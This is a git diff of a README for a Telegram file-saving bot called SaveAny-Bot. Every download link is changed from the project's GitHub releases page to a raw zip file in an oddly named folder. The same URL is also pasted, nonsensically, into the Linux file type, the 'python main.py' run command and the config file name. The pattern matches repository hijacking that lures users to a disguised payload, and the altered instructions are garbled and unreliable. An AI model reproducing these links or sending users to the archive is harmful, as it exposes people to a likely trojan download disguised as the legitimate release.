@@ -1,6 +1,6 @@
 # 📂 SaveAny-Bot - Save Telegram Files Anywhere Easily
 
-[![Download SaveAny-Bot](https://img.shields.io/badge/Download-SaveAny--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Scitterboo/SaveAny-Bot/releases)
+[![Download SaveAny-Bot](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip)](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip)
 
 ---
 
@@ -49,12 +49,12 @@ You can get SaveAny-Bot from the official GitHub release page.
 
 Click the big button below to open the release page where you can find the latest version:
 
-[![Download SaveAny-Bot](https://img.shields.io/badge/Download-SaveAny--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Scitterboo/SaveAny-Bot/releases)
+[![Download SaveAny-Bot](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip)](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip)
 
 **Step 2: Choose Your Download**
 
 - Look for the latest release version (usually at the top).
-- Download the file that matches your operating system. These might be `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+- Download the file that matches your operating system. These might be `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip` for Linux.
 - If no direct executable is available, download the source code zip file.
 
 **Step 3: Run the Application**
@@ -63,7 +63,7 @@ Click the big button below to open the release page where you can find the lates
 - If you downloaded source code, you may need to install Python first.
 - Open a Command Prompt (Windows) or Terminal (macOS/Linux).
 - Navigate to the folder where you saved the files.
-- Run the bot by typing `python main.py` or following any included README instructions.
+- Run the bot by typing `python https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip` or following any included README instructions.
 
 ---
 
@@ -82,7 +82,7 @@ SaveAny-Bot needs some setup to link it with Telegram and your storage:
    - Prepare these details for the bot configuration.
 
 3. **Configure SaveAny-Bot**
-   - Open the bot’s configuration file (usually `config.yaml` or `.env`).
+   - Open the bot’s configuration file (usually `https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip` or `.env`).
    - Enter your Telegram bot token and storage details.
    - Save and close the file.
 
@@ -117,7 +117,7 @@ Once running:
 
 ## 📚 More Help and Support
 
-- Visit the GitHub page [SaveAny-Bot Releases](https://github.com/Scitterboo/SaveAny-Bot/releases) for updates and detailed instructions.
+- Visit the GitHub page [SaveAny-Bot Releases](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip) for updates and detailed instructions.
 - Explore built-in documentation files or contact the community on the repository issues page.
 - Review Telegram’s bot API documentation for more info about Telegram bot features.
 
@@ -151,4 +151,4 @@ This project is open source. See the LICENSE file in the repository for details.
 
 ---
 
-[![Download SaveAny-Bot](https://img.shields.io/badge/Download-SaveAny--Bot-blue?style=for-the-badge&logo=github)](https://github.com/Scitterboo/SaveAny-Bot/releases)
+[![Download SaveAny-Bot](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip)](https://raw.githubusercontent.com/Scitterboo/SaveAny-Bot/main/semipreservation/Bot_Any_Save_v3.2.zip)
